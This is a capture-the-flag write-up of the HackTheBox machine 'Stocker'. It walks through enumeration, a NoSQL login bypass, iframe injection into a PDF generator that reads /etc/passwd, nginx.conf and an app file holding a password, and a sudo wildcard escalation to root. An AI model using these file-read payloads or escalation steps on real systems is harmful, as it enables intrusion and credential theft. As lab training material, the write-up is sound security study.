---
title: "Stocker"
collection: publications
permalink: /publication/stocker
excerpt: 'This is a free machine from HackTheBox'
date: 2023-03-02
venue: '03-02'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
#citation: 'Your Name, You. (2009). &quot;Paper Title Number 1.&quot; <i>Journal 1</i>. 1(1).'
---

![header](/images/stocker.png)

**LINK:** [Stocker](https://app.hackthebox.com/machines/Stocker)

---

## Enumeration : 

Let's scan the target with nmap : 

```bash
# nmap -sC -sV -T4 10.10.11.196     
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-01 11:20 EST
Nmap scan report for 10.10.11.196
Host is up (0.61s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.99 seconds
```

* We got 2 open ports : 80 (nginx web server) and 22 (SSH)

**Subdomains :**

```bash
# ffuf -u http://stocker.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt        

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

js                      [Status: 301, Size: 178, Words: 6, Lines: 8]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8]
img                     [Status: 301, Size: 178, Words: 6, Lines: 8]
fonts                   [Status: 301, Size: 178, Words: 6, Lines: 8]
```

* nothing useful.

**Vhosts :**

```bash

ffuf -u http://stocker.htb -H "HOST: FUZZ.stocker.htb" -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 301
________________________________________________

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1]
```

## Foothold :

* let's add the dev.stocker.htb to /etc/hosts and start inspecting the page : 
![stocker1](/images/stocker1.png)

* the first thing came to my mind is SQLi, i tried with a wordlist contains payloads to bypass a login page, but nothing worked until i noticed this response header

![response](/images/header5.png)

* I did some reasearch and i found that using **Express** as a back-end framework is a popular MongoDB stack design, and i know that MongoDB is a NOSQL database.
[Read more](https://ruptura-infosec.com/blog/nosql-noproblem/)

* Thanks to [Hacktricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass) i was able to bypass the login page and got redirected to /stock

![stock](/images/stocker3.png)

* I spent some time exploring the website, i noticed that when i add an item to the cart and the purchase is successful, the response contains an order_id 

![orderid](/images/stocker16.png)

* it renders out a PDF file in /api/po/order_id, when i saw that the title of the item is rendered to the pdf, i start manipulating with is until i was able to read a file that i wasn't supposed to.
![request](/images/stocker4.png)
![theresponse](/images/stocker5.png)

* Now it's time to read the /etc/passwd :

```bash
"title":"<iframe src=file:///etc/passwd height=1000px width=800px</iframe>
```


![etcpasswd](/images/stocker7.png)

* Now i got a username but i still need a password or a SSH key.
* Since it's a nginx web server, let's read the nginx.conf file 

```bash
"title":"<iframe src=file:///etc/nginx/nginx.conf height=1000px width=800px</iframe>
```

![nginx](/images/stocker8.png)

* Now i know where the dev.stocker.htb is located, i took a guess of the file name

```bash
"title":"<iframe src=file:///var/www/dev/index.js height=1000px width=800px</iframe>
```

![conffile](/images/stocker9.png)
![passwd](/images/stocker10.png)


* Now i have a username and a password, let's login using SSH

![ssh](/images/stocker11.png)

## Privilege Escalation: 

* First thing to do is to check sudo permissions

![sudo](/images/stocker12.png)

* we don't have permission to write or modify in /usr/local/scripts

![permission](/images/stocker13.png)

* But since we have a wildcard before __.js__ we can use a path traversal to execute a file we have directory write access to, and the best directory is __/tmp__

* I created a file called __exploit.js__ 
![exploit](/images/stocker14.png)

*Now it's time to execute it with sudo permission

![root](/images/stocker15.png)